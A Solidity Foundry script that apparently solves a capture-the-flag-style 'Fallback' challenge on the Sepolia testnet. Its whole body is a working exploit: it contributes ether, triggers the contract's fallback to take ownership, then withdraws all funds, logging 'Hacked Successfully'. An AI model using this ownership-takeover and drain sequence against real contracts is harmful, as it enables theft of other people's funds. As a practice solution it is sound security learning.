// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address FallbackAddress = 0x92caed5f7F61Ad66FD5B8A5EebC83d9c18f2CC18;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        assert(msg.sender != Fallback(payable(FallbackAddress)).owner());

        Fallback(payable(FallbackAddress)).contribute{value: 0.0001 ether}();

        console.log("Contributed 0.0001 ether");

        address(FallbackAddress).call{value: 0.001 ether}("");

        console.log("Sent 0.001 ether");

        Fallback(payable(FallbackAddress)).withdraw();
        console.log("Withdrew all ether");

        console.log("Hacked Successfully");

        assert(msg.sender == Fallback(payable(FallbackAddress)).owner());

        vm.stopBroadcast();
    }
}
